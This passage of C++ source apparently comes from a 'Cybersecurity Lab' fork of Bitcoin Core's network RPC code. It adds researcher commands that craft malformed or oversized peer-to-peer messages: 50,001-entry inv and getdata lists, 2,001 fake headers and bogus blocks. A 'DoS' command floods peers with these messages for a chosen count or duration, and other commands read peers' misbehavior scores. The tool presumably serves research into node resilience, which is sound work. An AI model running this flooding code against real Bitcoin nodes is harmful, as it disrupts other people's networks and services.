              GetRandBytes((unsigned char*)&nonce, sizeof(nonce));
          }
          int nNodeStartingHeight = pnode->GetMyStartingHeight();
          //NodeId nodeid = pnode->GetId();
          CAddress addr = pnode->addr;
          CAddress addrYou = (addr.IsRoutable() && !IsProxy(addr) ? addr : CAddress(CService(), addr.nServices));
          CAddress addrMe = CAddress(CService(), nLocalNodeServices);
          bool announceRelayTxes = true;

          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::VERSION, PROTOCOL_VERSION, (uint64_t)nLocalNodeServices, nTime, addrYou, addrMe, nonce, strSubVersion, nNodeStartingHeight, announceRelayTxes);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::VERSION));
          //netMsg = CNetMsgMaker(70012).Make(NetMsgType::VERSION, PROTOCOL_VERSION, (uint64_t)nLocalNodeServices, nTime, addrYou, addrMe, nonce, strSubVersion, nNodeStartingHeight, announceRelayTxes);
          //g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(70012).Make(NetMsgType::VERSION));

        } else if(msg == "verack") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::VERACK);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::VERACK));

        } else if(msg == "addr") {
          /*std::vector<CAddress> vAddr;
          for(int i = 0; i < 1000; i++) {
            vAddr.push_back(CAddress(CService("250.1.1.3", 8333), NODE_NONE))
          }*/
          // /*
          std::vector<CAddress> vAddr = g_rpc_node->connman->GetAddresses(); // Randomized vector of addresses
          outputMessage += "Originally " + std::to_string(vAddr.size()) + " addresses.\n";
          //if(vAddr.size() > 1000) vAddr.resize(1000); // Adds misbehaving
          outputMessage += "Sending " + std::to_string(vAddr.size()) + " addresses.";
          // */

          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::ADDR, vAddr);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::ADDR, vAddr));
          outputMessage += "\n\n";

        } else if(msg == "sendheaders") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::SENDHEADERS);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::SENDHEADERS));

        } else if(msg == "sendcmpct") {
          bool fAnnounceUsingCMPCTBLOCK;
          uint64_t nCMPCTBLOCKVersion;
          if(args.size() >= 1 && args[0] == "true") {
            fAnnounceUsingCMPCTBLOCK = true;
            outputMessage += "Announce using CMPCT Block: true\n";
          } else {
            fAnnounceUsingCMPCTBLOCK = false;
            outputMessage += "Announce using CMPCT Block: false\n";
          }
          if(args.size() >= 2 && args[1] == "1") {
            nCMPCTBLOCKVersion = 1;
            outputMessage += "CMPCT Version: 1";
          } else {
            nCMPCTBLOCKVersion = 2;
            outputMessage += "CMPCT Version: 2";
          }

          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::SENDCMPCT, fAnnounceUsingCMPCTBLOCK, nCMPCTBLOCKVersion);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::SENDCMPCT, fAnnounceUsingCMPCTBLOCK, nCMPCTBLOCKVersion));

          outputMessage += "\n\n";

        } else if(msg == "inv") {
          std::vector<CInv> inv;
          for(int i = 0; i < 50001; i++) {
            inv.push_back(CInv(MSG_TX, GetRandHash()));
          }
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::INV);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::INV, inv));

        } else if(msg == "getdata") {
          std::vector<CInv> inv;
          for(int i = 0; i < 50001; i++) {
            inv.push_back(CInv(MSG_TX, GetRandHash()));
          }
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETDATA);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETDATA, inv));
          // Find the last block the caller has in the main chain
          //const CBlockIndex* pindex = FindForkInGlobalIndex(chainActive, locator);
          //std::vector<CInv> vGetData;
          //vGetData.push_back(CInv(MSG_BLOCK | MSG_WITNESS_FLAG, pindex->GetBlockHash()));
          ////MarkBlockAsInFlight(pfrom->GetId(), pindex->GetBlockHash(), pindex);
          //  netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETDATA, vGetData));

        } else if(msg == "getblocks") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETBLOCKS);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETBLOCKS));

        } else if(msg == "getblocktxn") {
          BlockTransactionsRequest req;
          for (size_t i = 0; i < 10001; i++) {
              req.indexes.push_back(i);
          }
          req.blockhash = GetRandHash();
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETBLOCKTXN);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETBLOCKTXN, req));

        } else if(msg == "getheaders") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETHEADERS);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETHEADERS));

        } else if(msg == "tx") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::TX);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::TX));

        } else if(msg == "cmpctblock") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::CMPCTBLOCK);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::CMPCTBLOCK));

        } else if(msg == "blocktxn") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::BLOCKTXN);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::BLOCKTXN));

        } else if(msg == "headers") {
          std::vector<CBlock> vHeaders;
          for(int i = 0; i < 2001; i++) {
                uint64_t nonce = 0;
                while (nonce == 0) {
                    GetRandBytes((unsigned char*)&nonce, sizeof(nonce));
                }

              CBlockHeader block;
              block.nVersion       = 0x20400000;
              block.hashPrevBlock  = GetRandHash();
              block.hashMerkleRoot = GetRandHash();
              block.nTime          = GetAdjustedTime();
              block.nBits          = 0;
              block.nNonce         = nonce;
              vHeaders.push_back(block);
          }
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::HEADERS, vHeaders);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::HEADERS, vHeaders));

        } else if(msg == "block") {
          //std::shared_ptr<const CBlock> block;

	      uint64_t nonce = 0;
	      while (nonce == 0) {
	          GetRandBytes((unsigned char*)&nonce, sizeof(nonce));
	      }

          CBlockHeader header;
          header.nVersion       = 0x20400000;
          header.hashPrevBlock  = GetRandHash();
          header.hashMerkleRoot = GetRandHash();
          header.nTime          = GetAdjustedTime();
          header.nBits          = 0;
          header.nNonce         = nonce;

          CBlock block(header);

          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::BLOCK, block);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::BLOCK, block));

        } else if(msg == "getaddr") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETADDR);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::GETADDR));

        } else if(msg == "mempool") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::MEMPOOL);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::MEMPOOL));

        } else if(msg == "ping") {
          uint64_t nonce = 0;
          while (nonce == 0) {
              GetRandBytes((unsigned char*)&nonce, sizeof(nonce));
          }
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::PING, nonce);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::PING, nonce));

        } else if(msg == "pong") {
          uint64_t nonce = 0;
          while (nonce == 0) {
              GetRandBytes((unsigned char*)&nonce, sizeof(nonce));
          }
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::PONG, nonce);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::PONG, nonce));

        } else if(msg == "feefilter") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::FEEFILTER);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::FEEFILTER));

        } else if(msg == "notfound") {
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::NOTFOUND);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::NOTFOUND));

        } else if(msg == "merkleblock") {
          //CMerkleBlock merkleBlock = CMerkleBlock(*pblock, *pfrom->pfilter);
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::MERKLEBLOCK);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(NetMsgType::MERKLEBLOCK));

        } else if(args[0] != "None") {
          CDataStream message(ParseHex(msg), SER_NETWORK, PROTOCOL_VERSION);
          netMsg = CNetMsgMaker(PROTOCOL_VERSION).Make(args[0], message);
          g_rpc_node->connman->PushMessage(pnode, CNetMsgMaker(PROTOCOL_VERSION).Make(args[0], message));
        } else {
          throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Please enter a valid message type.");
        }
        //uint256 hash = GetRandHash(); //uint256S("00000000000000000000eafa519cd7e8e9847c43268001752b386dbbe47ac690");
        //CBlockLocator locator;
        //uint256 hashStop;
        //vRecv >> locator >> hashStop;

        //CSerializedNetMsg netMsg2 = netMsg;
        //g_rpc_node->connman->PushMessage(pnode, netMsg2);
    });
    if(!printResult) return "";

    // Timer end
    clock_t end = clock();
    int elapsed_time = end - begin;
    if(elapsed_time < 0) elapsed_time = -elapsed_time; // absolute value

    //std::vector<unsigned char> data;
    //std::string command;
    std::string data;
    for(unsigned char c: netMsg.data) { // 0000
      unsigned char c1 = c & 0b00001111;
      unsigned char c2 = (c & 0b11110000) / 16;
      data.push_back("0123456789ABCDEF"[c2]);
      data.push_back("0123456789ABCDEF"[c1]);
      data.push_back(' ');
    }
    std::stringstream output;
    output << netMsg.command << " was sent:\n" << outputMessage << "\nRaw data: " << data << "\n\nThat took " << std::to_string(elapsed_time) << " clocks (internal).";
    return  output.str(); //NullUniValue;
}


// Cybersecurity Lab
static UniValue DoS(const JSONRPCRequest& request)
{
    if (request.fHelp || request.params.size() < 3 || request.params.size() > 4)
        throw std::runtime_error(
            RPCHelpMan{"DoS",
                "\nSend a message.\n",
                {
                  {"duration", RPCArg::Type::STR, RPCArg::Optional::NO, "Duration"},
                  {"times/seconds/clocks", RPCArg::Type::STR, RPCArg::Optional::NO, "Unit"},
                  {"msg", RPCArg::Type::STR, RPCArg::Optional::NO, "Message type"},
                  {"args", RPCArg::Type::STR, /* default */ "None", "Arguments separated by ',')"},
                },
                RPCResults{},
                RPCExamples{
                    HelpExampleCli("DoS", "100 times ping") +
                    HelpExampleCli("DoS", "5 seconds sendcmpct true,2") +
                    HelpExampleCli("DoS", "5 seconds sendcmpct true,2") +
                    HelpExampleCli("DoS", "100 times [HEX CODE] [MESSAGE NAME]")
                },
            }.ToString());

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    std::string duration_str = request.params[0].get_str();
    int duration = 0;
    try {
      duration = std::stoi(duration_str);
    } catch (...) {}

    std::string unit = request.params[1].get_str();
    std::string msg = request.params[2].get_str();
    std::string rawArgs;
    try {
      rawArgs = request.params[3].get_str();
    } catch(const std::exception& e) {
      rawArgs = "None";
    }

    if(duration < 0) return "Invalid duration.";

    int count = 0;
    clock_t begin;
    if(unit == "time" || unit == "times") {
      begin = clock(); // Start timer
      for(int i = 0; i < duration; i++) {
        sendMessage(msg, rawArgs, false);
        count++;
      }
    } else if(unit == "clock" || unit == "clocks") {
      begin = clock(); // Start timer
      while(clock() - begin < duration) {
        sendMessage(msg, rawArgs, false);
        count++;
      }
    } else if(unit == "second" || unit == "seconds") {
      begin = clock(); // Start timer
      while(clock() - begin < duration * CLOCKS_PER_SEC) {
        sendMessage(msg, rawArgs, false);
        count++;
      }
    } else {
      return "Unit of measurement unknown.";
    }

    clock_t end = clock(); // End timer
    int elapsed_time = end - begin;
    if(elapsed_time < 0) elapsed_time = -elapsed_time; // absolute value

    std::stringstream output;
    output << "(" << msg << ") was sent " << std::to_string(count) << " times (" << std::to_string(elapsed_time) << " clocks)\nTotal time: " << std::to_string(elapsed_time) << " clocks";
    return  output.str();
}

// Cybersecurity Lab
static UniValue send(const JSONRPCRequest& request)
{
    if (request.fHelp || request.params.size() == 0 || request.params.size() > 2)
        throw std::runtime_error(
            RPCHelpMan{"send",
                "\nSend a message.\n",
                {
                  {"msg", RPCArg::Type::STR, RPCArg::Optional::NO, "Message type"},
                  {"args", RPCArg::Type::STR, /* default */ "None", "Arguments separated by ',')"},
                },
                RPCResults{},
                RPCExamples{
                    HelpExampleCli("send", "version") +
                    HelpExampleCli("send", "verack") +
                    HelpExampleCli("send", "addr") +
                    HelpExampleCli("send", "inv") +
                    HelpExampleCli("send", "getdata") +
                    HelpExampleCli("send", "merkleblock") +
                    HelpExampleCli("send", "getblocks") +
                    HelpExampleCli("send", "getheaders") +
                    HelpExampleCli("send", "tx") +
                    HelpExampleCli("send", "headers") +
                    HelpExampleCli("send", "block") +
                    HelpExampleCli("send", "getaddr") +
                    HelpExampleCli("send", "mempool") +
                    HelpExampleCli("send", "ping") +
                    HelpExampleCli("send", "pong") +
                    HelpExampleCli("send", "notfound") +
                    HelpExampleCli("send", "filterload") +
                    HelpExampleCli("send", "filteradd") +
                    HelpExampleCli("send", "filterclear") +
                    HelpExampleCli("send", "sendheaders") +
                    HelpExampleCli("send", "feefilter") +
                    HelpExampleCli("send", "sendcmpct [true or false, Use CMPCT],[1 or 2, Protocol version]") +
                    HelpExampleCli("send", "cmpctblock") +
                    HelpExampleCli("send", "getblocktxn") +
                    HelpExampleCli("send", "blocktxn") +
                    HelpExampleCli("send", "[HEX CODE] [MESSAGE NAME]")
                },
            }.ToString());

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    std::string msg = request.params[0].get_str();
    std::string rawArgs;
    try {
      rawArgs = request.params[1].get_str();
    } catch(const std::exception& e) {
      rawArgs = "None";
    }
    return sendMessage(msg, rawArgs, true);
}

// Cybersecurity Lab
static UniValue list(const JSONRPCRequest& request)
{
    if (request.fHelp || request.params.size() != 0)
        throw std::runtime_error(
            RPCHelpMan{"list",
                "\nGet the misbehavior score for each peer.\n",
                {},
                RPCResults{},
                RPCExamples{
                    HelpExampleCli("list", "")
            + HelpExampleRpc("list", "")
                },
            }.ToString());

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    std::vector<CNodeStats> vstats;
    g_rpc_node->connman->GetNodeStats(vstats);

    UniValue result(UniValue::VOBJ);
    for (const CNodeStats& stats : vstats) {
        CNodeStateStats statestats;
        bool fStateStats = GetNodeStateStats(stats.nodeid, statestats);
        if (fStateStats) {
            result.pushKV(stats.addrName, statestats.nMisbehavior);
        }
    }

    return result;
}



// Cybersecurity Lab
static UniValue toggleLog(const JSONRPCRequest& request)
{
    if (request.fHelp || request.params.size() > 1)
        throw std::runtime_error(
            RPCHelpMan{"log",
                "\nToggle the logging settings for a specific category.\n",
                {
                  {"category", RPCArg::Type::STR, RPCArg::Optional::NO, "Logging category"},
                },
                RPCResults{},
                RPCExamples{
                    HelpExampleCli("log", "all")
            + HelpExampleRpc("log", "all")
                },
            }.ToString());

    //if(!g_rpc_node->connman)
    //    throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    std::string parameter = request.params.size() == 0 ? "all" : request.params[0].get_str();
    bool category_found = false, category_active = false;
    BCLog::LogFlags category_flag;

    for (const CLogCategoryDesc& category_desc : LogCategories) {
          if(parameter == category_desc.category) {
            category_found = true;
            category_flag = category_desc.flag;
            category_active = LogAcceptCategory(category_flag);
          }
    }

    UniValue result(UniValue::VOBJ);
    if(category_found) {
      if(category_active) {
        LogInstance().DisableCategory(category_flag);
        result.pushKV("Category '" + parameter + "'", "SUCCESSFULLY DISABLED");
      } else {
        LogInstance().EnableCategory(category_flag);
        result.pushKV("Category '" + parameter + "'", "SUCCESSFULLY ENABLED");
      }
    } else {
      result.pushKV("Category '" + parameter + "'", "NOT FOUND");
    }

    std::vector<CLogCategoryActive> categories = ListActiveLogCategories();
    for(const CLogCategoryActive category : categories) {
      result.pushKV(category.category, category.active);
    }
    return result;
}


// Cybersecurity Lab
static UniValue listcmpct(const JSONRPCRequest& request)
{
    RPCHelpMan{"listcmpct",
                "\nGet the sendcmpct status of each peer.\n",
                {},
                RPCResults{},
                RPCExamples{
                    HelpExampleCli("listcmpct", "")
            + HelpExampleRpc("listcmpct", "")
                },
            }.Check(request);

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    std::vector<CNodeStats> vstats;
    g_rpc_node->connman->GetNodeStats(vstats);

    //LOCK(cs_main);
    UniValue result(UniValue::VOBJ);

    g_rpc_node->connman->ForEachNode([&result](CNode* pnode) {
        result.pushKV("Address", pnode->addr.ToString());
        result.pushKV("fProvidesHeaderAndIDs", State(pnode->GetId())->fProvidesHeaderAndIDs);
        result.pushKV("fWantsCmpctWitness", State(pnode->GetId())->fWantsCmpctWitness);
        result.pushKV("fPreferHeaderAndIDs", State(pnode->GetId())->fPreferHeaderAndIDs);
        result.pushKV("fSupportsDesiredCmpctVersion", State(pnode->GetId())->fSupportsDesiredCmpctVersion);
    });

    /*for (const CNodeStats& stats : vstats) {
        CNodeStateStats statestats;
        bool fStateStats = GetNodeStateStats(stats.nodeid, statestats);
        if (fStateStats) {
            result.pushKV("Address", stats.addrName);
            result.pushKV("fProvidesHeaderAndIDs", statestats.fProvidesHeaderAndIDs);
            result.pushKV("fWantsCmpctWitness", statestats.fWantsCmpctWitness);
            result.pushKV("fPreferHeaderAndIDs", statestats.fPreferHeaderAndIDs);
            result.pushKV("fSupportsDesiredCmpctVersion", statestats.fSupportsDesiredCmpctVersion);
        }
    }*/

    return result;
}


// Cybersecurity Lab
static UniValue setcmpct(const JSONRPCRequest& request)
{
    RPCHelpMan{"setcmpct",
                "\nSet the sendcmpct status of each peer.\n",
                {},
                RPCResults{},
                RPCExamples{
                    HelpExampleCli("setcmpct", "[true or false, Use CMPCT],[1 or 2, Protocol version]")
                },
            }.Check(request);

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    std::vector<CNodeStats> vstats;
    g_rpc_node->connman->GetNodeStats(vstats);

    //LOCK(cs_main);
    UniValue result(UniValue::VOBJ);

    /*
        if (strCommand == NetMsgType::SENDCMPCT) {
            bool fAnnounceUsingCMPCTBLOCK = false;
            uint64_t nCMPCTBLOCKVersion = 0;
            vRecv >> fAnnounceUsingCMPCTBLOCK >> nCMPCTBLOCKVersion;
            if (nCMPCTBLOCKVersion == 1 || ((pfrom->GetLocalServices() & NODE_WITNESS) && nCMPCTBLOCKVersion == 2)) {
                LOCK(cs_main);
                // fProvidesHeaderAndIDs is used to "lock in" version of compact blocks we send (fWantsCmpctWitness)
                if (!State(pfrom->GetId())->fProvidesHeaderAndIDs) {
                    State(pfrom->GetId())->fProvidesHeaderAndIDs = true;
                    State(pfrom->GetId())->fWantsCmpctWitness = nCMPCTBLOCKVersion == 2;
                }
                if (State(pfrom->GetId())->fWantsCmpctWitness == (nCMPCTBLOCKVersion == 2)) // ignore later version announces
                    State(pfrom->GetId())->fPreferHeaderAndIDs = fAnnounceUsingCMPCTBLOCK;
                if (!State(pfrom->GetId())->fSupportsDesiredCmpctVersion) {
                    if (pfrom->GetLocalServices() & NODE_WITNESS)
                        State(pfrom->GetId())->fSupportsDesiredCmpctVersion = (nCMPCTBLOCKVersion == 2);
                    else
                        State(pfrom->GetId())->fSupportsDesiredCmpctVersion = (nCMPCTBLOCKVersion == 1);
                }
            }
            return true;
        }
    */
    std::string rawArgs;
    try {
      rawArgs = request.params[0].get_str();
    } catch(const std::exception& e) {
      rawArgs = "None";
    }

    std::vector<std::string> args;
    std::stringstream ss(rawArgs);
    std::string item;
    while (getline(ss, item, ',')) {
        args.push_back(item);
    }
    if(args.size() != 2) {
        result.pushKV("Error", "Invalid arguments, there needs to be two, separated by a comma. Try \"setcmpct true,1\"");
        return result;
    }

    g_rpc_node->connman->ForEachNode([&result, &args](CNode* pnode) {
        bool fAnnounceUsingCMPCTBLOCK = args[0] == "true";
        uint64_t nCMPCTBLOCKVersion = args[1] == "1" ? 1 : 2;
        if (nCMPCTBLOCKVersion == 1 || ((pnode->GetLocalServices() & NODE_WITNESS) && nCMPCTBLOCKVersion == 2)) {
            LOCK(cs_main);
            // fProvidesHeaderAndIDs is used to "lock in" version of compact blocks we send (fWantsCmpctWitness)
            if (!State(pnode->GetId())->fProvidesHeaderAndIDs) {
                State(pnode->GetId())->fProvidesHeaderAndIDs = true;
                State(pnode->GetId())->fWantsCmpctWitness = nCMPCTBLOCKVersion == 2;
            }
            if (State(pnode->GetId())->fWantsCmpctWitness == (nCMPCTBLOCKVersion == 2)) // ignore later version announces
                State(pnode->GetId())->fPreferHeaderAndIDs = fAnnounceUsingCMPCTBLOCK;
            if (!State(pnode->GetId())->fSupportsDesiredCmpctVersion) {
                if (pnode->GetLocalServices() & NODE_WITNESS)
                    State(pnode->GetId())->fSupportsDesiredCmpctVersion = (nCMPCTBLOCKVersion == 2);
                else
                    State(pnode->GetId())->fSupportsDesiredCmpctVersion = (nCMPCTBLOCKVersion == 1);
            }
        }
        result.pushKV(pnode->addr.ToString(), "Success");
    });

    return result;
}

// Cybersecurity Lab
static UniValue listallstats(const JSONRPCRequest& request)
{
    RPCHelpMan{"listallstats",
                "\nGet node stats.\n",
                {},
                RPCResults{},
                RPCExamples{
                    HelpExampleCli("listallstats", "")
            + HelpExampleRpc("listallstats", "")
                },
            }.Check(request);

    if(!g_rpc_node->connman)
        throw JSONRPCError(RPC_CLIENT_P2P_DISABLED, "Error: Peer-to-peer functionality missing or disabled");

    std::vector<CNodeStats> vstats;
    g_rpc_node->connman->GetNodeStats(vstats);

    //LOCK(cs_main);
    UniValue result(UniValue::VOBJ);

    g_rpc_node->connman->ForEachNode([&result](CNode* pnode) {
        result.pushKV("Address", pnode->addr.ToString());
        result.pushKV("fCurrentlyConnected", State(pnode->GetId())->fCurrentlyConnected);
        result.pushKV("nMisbehavior", State(pnode->GetId())->nMisbehavior);
        result.pushKV("fShouldBan", State(pnode->GetId())->fShouldBan);
        result.pushKV("pindexBestKnownBlock", State(pnode->GetId())->pindexBestKnownBlock);
        result.pushKV("hashLastUnknownBlock", State(pnode->GetId())->hashLastUnknownBlock.GetHex());
        result.pushKV("pindexLastCommonBlock", State(pnode->GetId())->pindexLastCommonBlock);
        result.pushKV("pindexBestHeaderSent", State(pnode->GetId())->pindexBestHeaderSent);
        result.pushKV("nUnconnectingHeaders", State(pnode->GetId())->nUnconnectingHeaders);
        result.pushKV("fSyncStarted", State(pnode->GetId())->fSyncStarted);
        result.pushKV("nHeadersSyncTimeout", State(pnode->GetId())->nHeadersSyncTimeout);
        result.pushKV("nStallingSince", State(pnode->GetId())->nStallingSince);
        result.pushKV("nDownloadingSince", State(pnode->GetId())->nDownloadingSince);
        result.pushKV("nBlocksInFlight", State(pnode->GetId())->nBlocksInFlight);
        result.pushKV("nBlocksInFlightValidHeaders", State(pnode->GetId())->nBlocksInFlightValidHeaders);
        result.pushKV("fPreferredDownload", State(pnode->GetId())->fPreferredDownload);
        result.pushKV("fPreferHeaders", State(pnode->GetId())->fPreferHeaders);
        result.pushKV("fPreferHeaderAndIDs", State(pnode->GetId())->fPreferHeaderAndIDs);
        result.pushKV("fProvidesHeaderAndIDs", State(pnode->GetId())->fProvidesHeaderAndIDs);
        result.pushKV("fHaveWitness", State(pnode->GetId())->fHaveWitness);
        result.pushKV("fWantsCmpctWitness", State(pnode->GetId())->fWantsCmpctWitness);
        result.pushKV("fSupportsDesiredCmpctVersion", State(pnode->GetId())->fSupportsDesiredCmpctVersion);
        result.pushKV("m_last_block_announcement", State(pnode->GetId())->m_last_block_announcement);
    });

    /*for (const CNodeStats& stats : vstats) {
        CNodeStateStats statestats;
        bool fStateStats = GetNodeStateStats(stats.nodeid, statestats);
        if (fStateStats) {
            result.pushKV("IP", stats.addrName);
            result.pushKV("fProvidesHeaderAndIDs", statestats.fProvidesHeaderAndIDs);
            result.pushKV("fWantsCmpctWitness", statestats.fWantsCmpctWitness);
            result.pushKV("fPreferHeaderAndIDs", statestats.fPreferHeaderAndIDs);
            result.pushKV("fSupportsDesiredCmpctVersion", statestats.fSupportsDesiredCmpctVersion);
        }
    }*/

    return result;
}

// Cybersecurity Lab
// clang-format off
static const CRPCCommand commands[] =
{ //  category              name                      actor (function)         argNames
  //  --------------------- ------------------------  -----------------------  ----------
    { "network",            "getconnectioncount",     &getconnectioncount,     {} },
    { "network",            "ping",                   &ping,                   {} },
    { "network",            "getpeerinfo",            &getpeerinfo,            {} },
    { "network",            "addnode",                &addnode,                {"node","command"} },
    { "network",            "disconnectnode",         &disconnectnode,         {"address", "nodeid"} },
    { "network",            "getaddednodeinfo",       &getaddednodeinfo,       {"node"} },
    { "network",            "getnettotals",           &getnettotals,           {} },
    { "network",            "getnetworkinfo",         &getnetworkinfo,         {} },
    { "network",            "setban",                 &setban,                 {"subnet", "command", "bantime", "absolute"} },
    { "network",            "listbanned",             &listbanned,             {} },
    { "network",            "clearbanned",            &clearbanned,            {} },
    { "network",            "setnetworkactive",       &setnetworkactive,       {"state"} },
    { "network",            "getnodeaddresses",       &getnodeaddresses,       {"count"} },
    { "z Researcher",       "send",                   &send,                   {"msg", "args"} },
    { "z Researcher",       "DoS",                    &DoS,                    {"duration", "times/seconds/clocks", "msg", "args"} },
    { "z Researcher",       "list",                   &list,                   {} },
    { "z Researcher",       "log",                    &toggleLog,              {"category"} },
    { "z Researcher",       "listcmpct",              &listcmpct,              {} },
    { "z Researcher",       "setcmpct",               &setcmpct,               {} },
    { "z Researcher",       "listallstats",           &listallstats,           {} },
};
// clang-format on

void RegisterNetRPCCommands(CRPCTable &t)
{
    for (unsigned int vcidx = 0; vcidx < ARRAYLEN(commands); vcidx++)
        t.appendCommand(commands[vcidx].name, &commands[vcidx]);
}
